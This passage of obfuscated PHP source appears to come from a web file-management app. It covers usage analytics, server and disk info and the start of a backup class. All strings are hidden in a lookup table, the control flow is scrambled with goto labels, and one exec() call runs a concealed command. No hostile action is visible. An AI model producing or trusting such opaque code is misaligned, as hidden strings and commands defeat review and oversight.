array($aÒÈ¤ĞòŠŒ[1689] => 1980, $aÒÈ¤ĞòŠŒ[1987] => 1, $aÒÈ¤ĞòŠŒ[1988] => 1, $aÒÈ¤ĞòŠŒ[1989] => 0, $aÒÈ¤ĞòŠŒ[1990] => 0, $aÒÈ¤ĞòŠŒ[1991] => 0); } $bÕ´»ñÕãÛ[$aÒÈ¤ĞòŠŒ[1689]] -= 1980; return $bÕ´»ñÕãÛ[$aÒÈ¤ĞòŠŒ[1689]] << 25 | $bÕ´»ñÕãÛ[$aÒÈ¤ĞòŠŒ[1987]] << 21 | $bÕ´»ñÕãÛ[$aÒÈ¤ĞòŠŒ[1988]] << 16 | $bÕ´»ñÕãÛ[$aÒÈ¤ĞòŠŒ[1989]] << 11 | $bÕ´»ñÕãÛ[$aÒÈ¤ĞòŠŒ[1990]] << 5 | $bÕ´»ñÕãÛ[$aÒÈ¤ĞòŠŒ[1991]] >> 1; } protected function packFields($fç¯­‰­¾…) { $cîÊ…é÷Ò =& $_SERVER[¼]; $d£—öİæ×Ã = $cîÊ…é÷Ò[33]; $AÒê‡•›­Ò = array(); foreach ($fç¯­‰­¾… as $Eö°‰¹Î) { $d£—öİæ×Ã .= $Eö°‰¹Î[0]; $AÒê‡•›­Ò[] = $Eö°‰¹Î[1]; } array_unshift($AÒê‡•›­Ò, $d£—öİæ×Ã); return call_user_func_array($cîÊ…é÷Ò[1992], $AÒê‡•›­Ò); } protected function filterFilename($EÙ¾Ó×ªóƒ) { $Aº¹æ©Ô¿ò =& $_SERVER[¼]; return str_replace(array($Aº¹æ©Ô¿ò[95], $Aº¹æ©Ô¿ò[4], $Aº¹æ©Ô¿ò[173], $Aº¹æ©Ô¿ò[69], $Aº¹æ©Ô¿ò[113], $Aº¹æ©Ô¿ò[920], $Aº¹æ©Ô¿ò[923], $Aº¹æ©Ô¿ò[268]), $Aº¹æ©Ô¿ò[70], $EÙ¾Ó×ªóƒ); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($B·‹Åé…›Ã) { $b±‹¹İ„ƒÓ =& $_SERVER[¼]; $e³ğ£èÁÊƒ = array($b±‹¹İ„ƒÓ[531] => array($b±‹¹İ„ƒÓ[29] => $b±‹¹İ„ƒÓ[1993], $b±‹¹İ„ƒÓ[258] => array($b±‹¹İ„ƒÓ[207], $b±‹¹İ„ƒÓ[692], $b±‹¹İ„ƒÓ[1994], $b±‹¹İ„ƒÓ[1995])), $b±‹¹İ„ƒÓ[1996] => array($b±‹¹İ„ƒÓ[29] => $b±‹¹İ„ƒÓ[1997], $b±‹¹İ„ƒÓ[258] => array($b±‹¹İ„ƒÓ[207], $b±‹¹İ„ƒÓ[690], $b±‹¹İ„ƒÓ[1998], $b±‹¹İ„ƒÓ[1999], $b±‹¹İ„ƒÓ[2000]))); if (!isset($e³ğ£èÁÊƒ[$B·‹Åé…›Ã])) { return !1; } $this->optionType = $e³ğ£èÁÊƒ[$B·‹Åé…›Ã][$b±‹¹İ„ƒÓ[29]]; $this->field = $e³ğ£èÁÊƒ[$B·‹Åé…›Ã][$b±‹¹İ„ƒÓ[258]]; return !0; } public function listData($BÃšœ ¢Ï‹ = false, $AÂãÏÅ©¼ = "\x6d\x6f\144\151\146\x79\124\x69\x6d\x65", $B¹¶‡Ê‡Ëù = false) { return parent::listData($BÃšœ ¢Ï‹, $AÂãÏÅ©¼, $B¹¶‡Ê‡Ëù); } public function trendList($E¢›®«ô) { goto Aù¦ñÎšœ†; Aù¦ñÎšœ†: $c¼‘‹×¼„Ğ =& $_SERVER[¼]; $A‘Œ–¸†‡ = $this->listData(); if ($A‘Œ–¸†‡) { $C¢‡¥½ÀÁ = end($A‘Œ–¸†‡); $eãËË„‚Ö = date($c¼‘‹×¼„Ğ[2001], strtotime($c¼‘‹×¼„Ğ[2002])); if ($C¢‡¥½ÀÁ[$c¼‘‹×¼„Ğ[207]] == $eãËË„‚Ö) { return $A‘Œ–¸†‡; } $Eë˜Ì”Ó”§ = strtotime($C¢‡¥½ÀÁ[$c¼‘‹×¼„Ğ[207]]); } goto dœ¡„´Ê ß; AêÙäÃª†: foreach ($B‹Ç‚îš¬ as $eãËË„‚Ö) { $this->{$fÌË«›ï®}($eãËË„‚Ö); } return $this->listData(); goto F‘—Ò¢Ö°; dœ¡„´Ê ß: if (!isset($Eë˜Ì”Ó”§)) { $dßÈá±ß¼À = $E¢›®«ô == $c¼‘‹×¼„Ğ[531] ? $c¼‘‹×¼„Ğ[473] : $c¼‘‹×¼„Ğ[744]; $Eë˜Ì”Ó”§ = Model($dßÈá±ß¼À)->min($c¼‘‹×¼„Ğ[184]); } $fÌË«›ï® = $c¼‘‹×¼„Ğ[2003] . ucfirst($E¢›®«ô); $B‹Ç‚îš¬ = $this->dateList($Eë˜Ì”Ó”§); goto AêÙäÃª†; F‘—Ò¢Ö°: } private function dateList($bÛ¥ˆ…ÇĞ) { $cÌ˜¨„ÏùÑ =& $_SERVER[¼]; $B–÷Öñ­µš = $bÛ¥ˆ…ÇĞ; $FŞ“¶ç®ë = strtotime($cÌ˜¨„ÏùÑ[2002]); $a÷‚ïóñ‹ = array(); while ($B–÷Öñ­µš <= $FŞ“¶ç®ë) { $a÷‚ïóñ‹[] = date($cÌ˜¨„ÏùÑ[2001], $B–÷Öñ­µš); $B–÷Öñ­µš = strtotime($cÌ˜¨„ÏùÑ[2004], $B–÷Öñ­µš); } return $a÷‚ïóñ‹; } public function _recordUser($c™¥¿Â¶™ = '') { goto eÇÍØÏĞ¤‘; eÇÍØÏĞ¤‘: $EÄ¿ù×Åâ =& $_SERVER[¼]; $A×³Œëˆ“Â = strtotime(date($EÄ¿ù×Åâ[2005], strtotime($c™¥¿Â¶™))); $Dˆ¦ª¾£Ş = strtotime(date($EÄ¿ù×Åâ[2006], strtotime($c™¥¿Â¶™))); goto CñêëÂ†ß; CñêëÂ†ß: $C²š¸‰ºç¨ = array($EÄ¿ù×Åâ[184] => array($EÄ¿ù×Åâ[922], $Dˆ¦ª¾£Ş)); $eğõà’†Æ„ = Model($EÄ¿ù×Åâ[473])->where($C²š¸‰ºç¨)->count($EÄ¿ù×Åâ[1404]); $C²š¸‰ºç¨[$EÄ¿ù×Åâ[184]] = array($EÄ¿ù×Åâ[318], array($A×³Œëˆ“Â, $Dˆ¦ª¾£Ş)); goto EêĞçÊŠ²æ; EêĞçÊŠ²æ: $d“¤Ô·¹šã = Model($EÄ¿ù×Åâ[473])->where($C²š¸‰ºç¨)->count($EÄ¿ù×Åâ[1404]); $C²š¸‰ºç¨[$EÄ¿ù×Åâ[29]] = $EÄ¿ù×Åâ[2007]; $cÒÑİÁ¶àÖ = Model($EÄ¿ù×Åâ[2008])->where($C²š¸‰ºç¨)->count($EÄ¿ù×Åâ[2009]); goto aø·Ô“ºÒ; aø·Ô“ºÒ: $a°Ü®¹¾­Æ = array($EÄ¿ù×Åâ[207] => $c™¥¿Â¶™, $EÄ¿ù×Åâ[692] => (int) $eğõà’†Æ„, $EÄ¿ù×Åâ[1994] => (int) $d“¤Ô·¹šã, $EÄ¿ù×Åâ[1995] => (int) $cÒÑİÁ¶àÖ); return $this->insert($a°Ü®¹¾­Æ); goto e•Šİ×Œœ; e•Šİ×Œœ: } public function _recordStore($fÌ×¨××ï£ = '') { goto AâÌ§¨Î­À; fîÅİğâ×ƒ: $dÏ³¤îËç = Model($B¾—Àè†ëÇ[418])->where($DŒ¯¸Ö·Èè)->sum($B¾—Àè†ëÇ[77]); $DŒ¯¸Ö·Èè[$B¾—Àè†ëÇ[367]] = 0; $féÁÑÙåç = Model($B¾—Àè†ëÇ[744])->where($DŒ¯¸Ö·Èè)->sum($B¾—Àè†ëÇ[77]); goto fµï½Â…º—; Ašé¥ÈøÄ: $c·±¶„ŞÀ‘ = Model($B¾—Àè†ëÇ[744])->where($DŒ¯¸Ö·Èè)->sum($B¾—Àè†ëÇ[77]); $dÂÇ·»¹Íè = array($B¾—Àè†ëÇ[207] => $fÌ×¨××ï£, $B¾—Àè†ëÇ[690] => (int) $féÁÑÙåç, $B¾—Àè†ëÇ[1998] => (int) $dÏ³¤îËç, $B¾—Àè†ëÇ[1999] => (int) $c°†³©¼«‡, $B¾—Àè†ëÇ[2000] => (int) $c·±¶„ŞÀ‘); return $this->insert($dÂÇ·»¹Íè); goto BÒóÃÇ••; AâÌ§¨Î­À: $B¾—Àè†ëÇ =& $_SERVER[¼]; $BÄœ¼–÷èá = strtotime(date($B¾—Àè†ëÇ[2006], strtotime($fÌ×¨××ï£))); $DŒ¯¸Ö·Èè = array($B¾—Àè†ëÇ[184] => array($B¾—Àè†ëÇ[922], $BÄœ¼–÷èá)); goto fîÅİğâ×ƒ; fµï½Â…º—: $DŒ¯¸Ö·Èè[$B¾—Àè†ëÇ[368]] = 1; $c°†³©¼«‡ = Model($B¾—Àè†ëÇ[744])->where($DŒ¯¸Ö·Èè)->sum($B¾—Àè†ëÇ[77]); $DŒ¯¸Ö·Èè[$B¾—Àè†ëÇ[368]] = 2; goto Ašé¥ÈøÄ; BÒóÃÇ••: } public function trend($eÆÂ‰œø²±, $AÓ£ù”íé) { goto E‰…§ÔùĞé; E‰…§ÔùĞé: $b†’àÄ™›½ =& $_SERVER[¼]; if (!$this->init($eÆÂ‰œø²±)) { return !1; } $dˆàâŠäøÏ = $this->trendList($eÆÂ‰œø²±); goto bÔŠÙØ¦›; Bè¯—…»Ü: if (empty($dˆàâŠäøÏ)) { $DÉ±®×ÓÓ = date($b†’àÄ™›½[2001], strtotime($b†’àÄ™›½[2002])); $dÀ¦ÛÔ = array($b†’àÄ™›½[207] => $DÉ±®×ÓÓ); foreach ($bª÷ °é†Ô[$eÆÂ‰œø²±] as $FŒÉò‘”‡ => $c¡è‘ƒ³ìÒ) { $dÀ¦ÛÔ[$FŒÉò‘”‡] = 0; } $dˆàâŠäøÏ[] = $dÀ¦ÛÔ; } $DŠ©ãßä = array(); foreach ($dˆàâŠäøÏ as $c¡è‘ƒ³ìÒ) { if ($eÆÂ‰œø²± == $b†’àÄ™›½[1996] && $c¡è‘ƒ³ìÒ[$b†’àÄ™›½[1998]] > $c¡è‘ƒ³ìÒ[$b†’àÄ™›½[690]]) { $c¡è‘ƒ³ìÒ[$b†’àÄ™›½[1998]] = $c¡è‘ƒ³ìÒ[$b†’àÄ™›½[690]]; } foreach ($bª÷ °é†Ô[$eÆÂ‰œø²±] as $FŒÉò‘”‡ => $Cìëò£Ü¿) { $döÀ¤ ›¢á = array($b†’àÄ™›½[207] => $c¡è‘ƒ³ìÒ[$b†’àÄ™›½[207]], $b†’àÄ™›½[1312] => $Cìëò£Ü¿); $döÀ¤ ›¢á[$D­×‰¾¥ [$eÆÂ‰œø²±]] = isset($c¡è‘ƒ³ìÒ[$FŒÉò‘”‡]) ? $c¡è‘ƒ³ìÒ[$FŒÉò‘”‡] : 0; $DŠ©ãßä[] = $döÀ¤ ›¢á; } } goto eîøÈ¢Å„; bÔŠÙØ¦›: if ($dˆàâŠäøÏ && $AÓ£ù”íé != $b†’àÄ™›½[1379]) { $CÚŒ¦ÚÕ® = $dˆàâŠäøÏ[0][$b†’àÄ™›½[207]]; $D°£Úòäèù = $this->validDate($AÓ£ù”íé, $CÚŒ¦ÚÕ®); $f¼šÑÖÖƒ = array(); $Bö–»•§¨„ = array_to_keyvalue($dˆàâŠäøÏ, $b†’àÄ™›½[207]); foreach ($D°£Úòäèù as $DÉ±®×ÓÓ) { if (isset($Bö–»•§¨„[$DÉ±®×ÓÓ])) { $döÀ¤ ›¢á = $Bö–»•§¨„[$DÉ±®×ÓÓ]; } else { $döÀ¤ ›¢á = end($dˆàâŠäøÏ); $döÀ¤ ›¢á[$b†’àÄ™›½[207]] = $DÉ±®×ÓÓ; if ($eÆÂ‰œø²± == $b†’àÄ™›½[531]) { $döÀ¤ ›¢á[$b†’àÄ™›½[1994]] = $döÀ¤ ›¢á[$b†’àÄ™›½[1995]] = 0; } } $f¼šÑÖÖƒ[] = $döÀ¤ ›¢á; } $dˆàâŠäøÏ = $f¼šÑÖÖƒ; } $bª÷ °é†Ô = array($b†’àÄ™›½[531] => array($b†’àÄ™›½[692] => LNG($b†’àÄ™›½[2010]), $b†’àÄ™›½[1994] => LNG($b†’àÄ™›½[2011]), $b†’àÄ™›½[1995] => LNG($b†’àÄ™›½[2012])), $b†’àÄ™›½[1996] => array($b†’àÄ™›½[690] => LNG($b†’àÄ™›½[2013]), $b†’àÄ™›½[1998] => LNG($b†’àÄ™›½[2014]), $b†’àÄ™›½[1999] => LNG($b†’àÄ™›½[2015]), $b†’àÄ™›½[2000] => LNG($b†’àÄ™›½[2016]))); $D­×‰¾¥  = array($b†’àÄ™›½[531] => $b†’àÄ™›½[2017], $b†’àÄ™›½[1996] => $b†’àÄ™›½[77]); goto Bè¯—…»Ü; eîøÈ¢Å„: return $DŠ©ãßä; goto C‹ìÍ ù¥¨; C‹ìÍ ù¥¨: } public function validDate($aİÖˆ´½¤Ë, $CŠŸÁÃÔ¸’) { goto FëÇ†Çóá; bÚ²„ƒÚ“Œ: return $FÁšŞ‹»ä“; goto aå‰¼ïÏæ¿; FëÇ†Çóá: $a¾Š¹›ñ¹Ç =& $_SERVER[¼]; $FõÍ‡”é£ã = date($a¾Š¹›ñ¹Ç[2001], strtotime($a¾Š¹›ñ¹Ç[2002])); $FÁšŞ‹»ä“ = array($FõÍ‡”é£ã); goto C¦·¥™Ç˜¬; C¦·¥™Ç˜¬: switch ($aİÖˆ´½¤Ë) { case $a¾Š¹›ñ¹Ç[1386]: $cÏÜ–Õ¬ËÉ = mktime(0, 0, 0, date($a¾Š¹›ñ¹Ç[2018]), date($a¾Š¹›ñ¹Ç[2019]) - date($a¾Š¹›ñ¹Ç[1211]) + 7 - 7, date($a¾Š¹›ñ¹Ç[2020])); $B£íµ¬âÃƒ = 0; do { $E½‹ÊÄñÀ· = date($a¾Š¹›ñ¹Ç[2001], $cÏÜ–Õ¬ËÉ - 3600 * 24 * 7 * $B£íµ¬âÃƒ); $FÁšŞ‹»ä“[] = $E½‹ÊÄñÀ·; $B£íµ¬âÃƒ++; } while ($CŠŸÁÃÔ¸’ < $E½‹ÊÄñÀ·); break; case $a¾Š¹›ñ¹Ç[1384]: $B£íµ¬âÃƒ = 1; do { $fÄŒ†ù„Ñ = date($a¾Š¹›ñ¹Ç[2021], strtotime("\55\40{$B£íµ¬âÃƒ}\40\x6d\157\156\164\150\x73")); $FÁšŞ‹»ä“[] = $fÄŒ†ù„Ñ; $B£íµ¬âÃƒ++; } while ($CŠŸÁÃÔ¸’ < $fÄŒ†ù„Ñ); break; case $a¾Š¹›ñ¹Ç[1689]: $A†Œª»ö¤¤ = (int) date($a¾Š¹›ñ¹Ç[2020], strtotime($CŠŸÁÃÔ¸’)); $D£ˆĞ¼¡Œœ = (int) date($a¾Š¹›ñ¹Ç[2020]); if ($A†Œª»ö¤¤ >= $D£ˆĞ¼¡Œœ) { break; } for ($A†Œª»ö¤¤; $A†Œª»ö¤¤ < $D£ˆĞ¼¡Œœ; $A†Œª»ö¤¤++) { $FÁšŞ‹»ä“[] = $A†Œª»ö¤¤ . $a¾Š¹›ñ¹Ç[2022]; } break; default: break; } if ($CŠŸÁÃÔ¸’ > end($FÁšŞ‹»ä“)) { array_pop($FÁšŞ‹»ä“); } sort($FÁšŞ‹»ä“); goto bÚ²„ƒÚ“Œ; aå‰¼ïÏæ¿: } public function listTable($EÄì–áöÖ§) { $E³ÚÒÈË¨ò = ucfirst($EÄì–áöÖ§); return Model($E³ÚÒÈË¨ò)->listData(); } public function option($A©¸ ì¢ö‡) { $D¼¹öº‰°› = $_SERVER[¼][2023] . ucfirst($A©¸ ì¢ö‡); return $this->{$D¼¹öº‰°›}(); } private function optionUser() { goto cºô©ß‰•; C‹ ç¢åø©: $cˆ¯Åâ£‰‰ = strtotime($F·ßİå¯Ç¤[2025]); $cÜ˜¨Šô¤ô = array($F·ßİå¯Ç¤[2026] => array($F·ßİå¯Ç¤[923], $cˆ¯Åâ£‰‰)); $C÷±®îæµœ = (int) Model($F·ßİå¯Ç¤[473])->where($cÜ˜¨Šô¤ô)->count($F·ßİå¯Ç¤[1404]); goto C¸Ü›òÎœ—; cèöËß¦ºè: $bºğ•İïë» = Model($F·ßİå¯Ç¤[473])->where($cÜ˜¨Šô¤ô)->count($F·ßİå¯Ç¤[1404]); return array($F·ßİå¯Ç¤[687] => (int) $dõ˜Ğ¶¢™, $F·ßİå¯Ç¤[2027] => (int) ($dõ˜Ğ¶¢™ - $A¿’¶·Ô„), $F·ßİå¯Ç¤[2028] => (int) $A¿’¶·Ô„, $F·ßİå¯Ç¤[2029] => (int) $bºğ•İïë», $F·ßİå¯Ç¤[2030] => $C÷±®îæµœ); goto c¼ö¹–ƒ´; C¸Ü›òÎœ—: if (!$C÷±®îæµœ) { $C÷±®îæµœ = 1; } $cˆ¯Åâ£‰‰ = strtotime(date($F·ßİå¯Ç¤[2005])); $cÜ˜¨Šô¤ô = array($F·ßİå¯Ç¤[2026] => array($F·ßİå¯Ç¤[923], $cˆ¯Åâ£‰‰)); goto cèöËß¦ºè; cºô©ß‰•: $F·ßİå¯Ç¤ =& $_SERVER[¼]; $dõ˜Ğ¶¢™ = Model($F·ßİå¯Ç¤[473])->count($F·ßİå¯Ç¤[1404]); $A¿’¶·Ô„ = Model($F·ßİå¯Ç¤[473])->where($F·ßİå¯Ç¤[2024])->count($F·ßİå¯Ç¤[1404]); goto C‹ ç¢åø©; c¼ö¹–ƒ´: } private function optionFile() { goto DÓ¦Ö›ß¹ğ; D—µ³ºßå: $c°âÖˆš’Ö = Model($cóæÖ‹·é[744])->where($c¦š™èÖÉ)->sum($cóæÖ‹·é[77]); $bŒ»Ë˜À‰Å = Model($cóæÖ‹·é[744])->where($c¦š™èÖÉ)->count($cóæÖ‹·é[366]); return array($cóæÖ‹·é[690] => $Bä™×—äÁ›, $cóæÖ‹·é[1998] => $dÕòÂÚ, $cóæÖ‹·é[2031] => $Bä™×—äÁ› - $dÕòÂÚ, $cóæÖ‹·é[2032] => (int) $c°âÖˆš’Ö, $cóæÖ‹·é[692] => (int) $b¹éŠ–µ‹, $cóæÖ‹·é[2033] => (int) $bŒ»Ë˜À‰Å); goto cí ÂÌ‘õá; Aó‹ŒÌÑà: $dÕòÂÚ = $D³éë¼©‚[$cóæÖ‹·é[1998]]; $b¹éŠ–µ‹ = Model($cóæÖ‹·é[744])->where(array($cóæÖ‹·é[367] => 0))->count($cóæÖ‹·é[366]); $c¦š™èÖÉ = array($cóæÖ‹·é[367] => 0, $cóæÖ‹·é[184] => array($cóæÖ‹·é[923], strtotime(date($cóæÖ‹·é[2005])))); goto D—µ³ºßå; DÓ¦Ö›ß¹ğ: $cóæÖ‹·é =& $_SERVER[¼]; $D³éë¼©‚ = $this->sourceSize(); $Bä™×—äÁ› = $D³éë¼©‚[$cóæÖ‹·é[77]]; goto Aó‹ŒÌÑà; cí ÂÌ‘õá: } private function optionAccess() { $c“ÉÁ¬†” =& $_SERVER[¼]; return array($c“ÉÁ¬†”[687] => $this->typeLogCnt(), $c“ÉÁ¬†”[91] => $this->typeLogCnt($c“ÉÁ¬†”[91]), $c“ÉÁ¬†”[400] => $this->typeLogCnt($c“ÉÁ¬†”[400]), $c“ÉÁ¬†”[2034] => $this->typeLogCnt($c“ÉÁ¬†”[2034]), $c“ÉÁ¬†”[2035] => $this->typeLogCnt($c“ÉÁ¬†”[2035]), $c“ÉÁ¬†”[531] => $this->typeLogCnt($c“ÉÁ¬†”[33], $c“ÉÁ¬†”[2009])); } private function typeLogCnt($eƒ¼Š´°¨ = '', $C÷‡ëÄŞ‰ = "\151\144") { goto däÆÕ›…Ï‹; däÆÕ›…Ï‹: $B¢¯¡¡¾£² =& $_SERVER[¼]; $C”–ÇğËïÜ = array($B¢¯¡¡¾£²[91] => array($B¢¯¡¡¾£²[2036], $B¢¯¡¡¾£²[2037]), $B¢¯¡¡¾£²[400] => array($B¢¯¡¡¾£²[2038], $B¢¯¡¡¾£²[2039]), $B¢¯¡¡¾£²[2034] => array($B¢¯¡¡¾£²[2040], $B¢¯¡¡¾£²[2041]), $B¢¯¡¡¾£²[2035] => array($B¢¯¡¡¾£²[2042], $B¢¯¡¡¾£²[2043]), $B¢¯¡¡¾£²[2044] => array($B¢¯¡¡¾£²[2045], $B¢¯¡¡¾£²[2046], $B¢¯¡¡¾£²[2047])); $f‚®é¿ï² = strtotime(date($B¢¯¡¡¾£²[2005])); goto fƒš³šÕÃÂ; a¿ë´İëÍù: return (int) $c¿¥  ĞÇ; goto FÛêíã»Ì­; fƒš³šÕÃÂ: $F°óÛ˜”œ = array($B¢¯¡¡¾£²[184] => array($B¢¯¡¡¾£²[923], $f‚®é¿ï²)); if ($eƒ¼Š´°¨) { $F°óÛ˜”œ[$B¢¯¡¡¾£²[29]] = array($B¢¯¡¡¾£²[7], $C”–ÇğËïÜ[$eƒ¼Š´°¨]); } $c¿¥  ĞÇ = Model($B¢¯¡¡¾£²[2008])->where($F°óÛ˜”œ)->count($C÷‡ëÄŞ‰); goto a¿ë´İëÍù; FÛêíã»Ì­: } private function optionServer() { goto FŠ‹è“¼à³; AÄàçÙªÅ: return array($eæèº‚Š˜•[2050] => $eßßîòä‘ù ? $eßßîòä‘ù[$eæèº‚Š˜•[2051]] : 0, $eæèº‚Š˜•[2052] => $eßßîòä‘ù ? $eßßîòä‘ù[$eæèº‚Š˜•[2053]] : 0, $eæèº‚Š˜•[2054] => (int) $FãÆåæÙ‚…[$eæèº‚Š˜•[2051]] * 1024 * 1024 * 1024, $eæèº‚Š˜•[2055] => (int) $E„‹Œ§Š©Û, $eæèº‚Š˜•[2056] => ucfirst($CñÒ×Œ¿), $eæèº‚Š˜•[2057] => $eæèº‚Š˜•[2058] . PHP_VERSION, $eæèº‚Š˜•[2059] => phpBuild64() ? 64 : 32, $eæèº‚Š˜•[686] => str_replace($eæèº‚Š˜•[2060], $eæèº‚Š˜•[899], $F³ò±„), $eæèº‚Š˜•[334] => ucfirst($dÇˆÕ·Ë„é), $eæèº‚Š˜•[28] => $_SERVER[$eæèº‚Š˜•[2061]]); goto dŠ×„ÁŠ–Ï; aÑ£âØ±¾Œ: if ($F³ò±„ == $eæèº‚Š˜•[716]) { $fÔˆªŞØÄ  = explode($eæèº‚Š˜•[1069], $F–¢ó·„çÔ[$eæèº‚Š˜•[882]]); $F³ò±„ = $fÔˆªŞØÄ [0]; } if ($F³ò±„ == $eæèº‚Š˜•[719] || $F³ò±„ == $eæèº‚Š˜•[720]) { $a÷É×ÜÂ¾» = Model()->db()->query($eæèº‚Š˜•[2048]); $D‚½¯†â¥† = $a÷É×ÜÂ¾»[0] && isset($a÷É×ÜÂ¾»[0][$eæèº‚Š˜•[1311]]) ? $a÷É×ÜÂ¾»[0][$eæèº‚Š˜•[1311]] : 0; $F³ò±„ = $eæèº‚Š˜•[2049] . ($D‚½¯†â¥† ? $eæèº‚Š˜•[8] . $D‚½¯†â¥† : $eæèº‚Š˜•[33]); } $dÇˆÕ·Ë„é = $GLOBALS[$eæèº‚Š˜•[6]][$eæèº‚Š˜•[334]][$eæèº‚Š˜•[745]]; goto AÄàçÙªÅ; E§Ş²”¾È·: $e·À®Äø†î = array($eæèº‚Š˜•[735] => $FãÆåæÙ‚…[$eæèº‚Š˜•[364]]); $E„‹Œ§Š©Û = Model($eæèº‚Š˜•[418])->where($e·À®Äø†î)->sum($eæèº‚Š˜•[77]); $Bø…¸éÉğ³ = explode($eæèº‚Š˜•[50], $_SERVER[$eæèº‚Š˜•[138]]); goto Eˆ°ª“¼·¨; Eˆ°ª“¼·¨: $CñÒ×Œ¿ = $Bø…¸éÉğ³[0]; $F–¢ó·„çÔ = $GLOBALS[$eæèº‚Š˜•[6]][$eæèº‚Š˜•[17]]; $F³ò±„ = $F–¢ó·„çÔ[$eæèº‚Š˜•[883]]; goto aÑ£âØ±¾Œ; FŠ‹è“¼à³: $eæèº‚Š˜• =& $_SERVER[¼]; $eßßîòä‘ù = $this->diskDriver(); $FãÆåæÙ‚… = KodIO::defaultDriver(); goto E§Ş²”¾È·; dŠ×„ÁŠ–Ï: } private function diskDriver() { goto D†ñÄ³À„‹; D†ñÄ³À„‹: $E¨ßñÃÊ =& $_SERVER[¼]; $Eô‘—İÜåÕ = $E¨ßñÃÊ[8]; $FÉ‘äø“öØ = $GLOBALS[$E¨ßñÃÊ[6]][$E¨ßñÃÊ[2062]] == $E¨ßñÃÊ[2063]; goto DŒ™‰÷Ç•; DŒ™‰÷Ç•: if ($FÉ‘äø“öØ) { $Eô‘—İÜåÕ = $E¨ßñÃÊ[2064]; if (function_exists($E¨ßñÃÊ[2065])) { exec($E¨ßñÃÊ[2066], $Cª‘µÚ­¾º); $Eô‘—İÜåÕ = $Cª‘µÚ­¾º[1] . $E¨ßñÃÊ[8]; } } if (!file_exists($Eô‘—İÜåÕ)) { return; } $fïÂ’çÚˆ† = @disk_total_space($Eô‘—İÜåÕ); goto dÇ¨Œè…è©; dÇ¨Œè…è©: $b¿ìË·Îš = $fïÂ’çÚˆ† - @disk_free_space($Eô‘—İÜåÕ); return array($E¨ßñÃÊ[2051] => $fïÂ’çÚˆ†, $E¨ßñÃÊ[2053] => $b¿ìË·Îš); goto A•‘Ğë‡´´; A•‘Ğë‡´´: } public function fileChart($DøšÉÅøó) { goto FÜ¯™¦È£‡; DŸæù‹Çí‘: $dØ ¥Í»›ø[$DĞ·äù†ùÓ[368]] = 2; $C»½Ïä¼ÎÌ = Model($DĞ·äù†ùÓ[744])->where($dØ ¥Í»›ø)->sum($DĞ·äù†ùÓ[77]); return array($DĞ·äù†ùÓ[690] => $EÇçâ¶¸Ì×[$DĞ·äù†ùÓ[77]], $DĞ·äù†ùÓ[1998] => $EÇçâ¶¸Ì×[$DĞ·äù†ùÓ[1998]], $DĞ·äù†ùÓ[1999] => (int) $a´¾ÔöĞ…ß, $DĞ·äù†ùÓ[2000] => (int) $C»½Ïä¼ÎÌ); goto B“¥èÃ†«®; Dä«¦éï: $EÇçâ¶¸Ì× = $this->sourceSize(); $dØ ¥Í»›ø = array($DĞ·äù†ùÓ[457] => 0, $DĞ·äù†ùÓ[368] => 1); $a´¾ÔöĞ…ß = Model($DĞ·äù†ùÓ[744])->where($dØ ¥Í»›ø)->sum($DĞ·äù†ùÓ[77]); goto DŸæù‹Çí‘; FÜ¯™¦È£‡: $DĞ·äù†ùÓ =& $_SERVER[¼]; if (isset($DøšÉÅøó[$DĞ·äù†ùÓ[1404]])) { return Model($DĞ·äù†ùÓ[744])->userFileTypeProfile($DøšÉÅøó[$DĞ·äù†ùÓ[1404]]); } if (isset($DøšÉÅøó[$DĞ·äù†ùÓ[2067]])) { return Model($DĞ·äù†ùÓ[744])->groupFileTypeProfile($DøšÉÅøó[$DĞ·äù†ùÓ[2067]]); } goto Dä«¦éï; B“¥èÃ†«®: } private function sourceSize() { $CÌ‹‡Š‡÷‘ =& $_SERVER[¼]; $fŸƒ·ÁÚÏ = Model($CÌ‹‡Š‡÷‘[744])->where(array($CÌ‹‡Š‡÷‘[367] => 0))->sum($CÌ‹‡Š‡÷‘[77]); $D‹š°ÃÓ½¼ = Model($CÌ‹‡Š‡÷‘[418])->sum($CÌ‹‡Š‡÷‘[77]); if ($D‹š°ÃÓ½¼ > $fŸƒ·ÁÚÏ) { $D‹š°ÃÓ½¼ = $fŸƒ·ÁÚÏ; } return array($CÌ‹‡Š‡÷‘[77] => (int) $fŸƒ·ÁÚÏ, $CÌ‹‡Š‡÷‘[1998] => (int) $D‹š°ÃÓ½¼); } } goto F¼ÌÃäÁ‚¯; Eˆğè’ËÂ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $a—˜Á¿Ë‡ =& $_SERVER[¼]; self::$name = date($a—˜Á¿Ë‡[679]); if (!($Eã›‡Ôƒˆí = Model($a—˜Á¿Ë‡[680])->lastItem())) { $Eã›‡Ôƒˆí = $this->initData(); } else { self::$name = $Eã›‡Ôƒˆí[$a—˜Á¿Ë‡[28]]; if ($Eã›‡Ôƒˆí[$a—˜Á¿Ë‡[681]] == $a—˜Á¿Ë‡[83]) { self::$name = date($a—˜Á¿Ë‡[682]); $b™±÷‚š˜Å = 0; if (isset($Eã›‡Ôƒˆí[$a—˜Á¿Ë‡[278]][$a—˜Á¿Ë‡[164]][$a—˜Á¿Ë‡[415]])) { $b™±÷‚š˜Å = (int) $Eã›‡Ôƒˆí[$a—˜Á¿Ë‡[278]][$a—˜Á¿Ë‡[164]][$a—˜Á¿Ë‡[415]]; } if ($Eã›‡Ôƒˆí[$a—˜Á¿Ë‡[28]] == self::$name) { Model($a—˜Á¿Ë‡[680])->remove($Eã›‡Ôƒˆí[$a—˜Á¿Ë‡[364]]); } $Eã›‡Ôƒˆí = $this->initData($b™±÷‚š˜Å, $Eã›‡Ôƒˆí[$a—˜Á¿Ë‡[683]]); } else { $this->checkStore($Eã›‡Ôƒˆí[$a—˜Á¿Ë‡[683]]); } } self::$option = $Eã›‡Ôƒˆí; } private function initData($bÍ˜Ú†ÑŞÈ = 0, $b¼Ú’ãóÆÆ = '') { goto BÖ×ñïË¦Å; BÖ×ñïË¦Å: $c¤§½È™£ =& $_SERVER[¼]; $C‡îëÜ¿ß  = Model($c¤§½È™£[680])->config(); if ($b¼Ú’ãóÆÆ && $C‡îëÜ¿ß [$c¤§½È™£[683]] != $b¼Ú’ãóÆÆ) { $bÍ˜Ú†ÑŞÈ = 0; } goto A˜Û“ªâ©Œ; A˜Û“ªâ©Œ: $this->checkStore($C‡îëÜ¿ß [$c¤§½È™£[683]]); $cë¦ß£Ì„ò = array($c¤§½È™£[683] => $C‡îëÜ¿ß 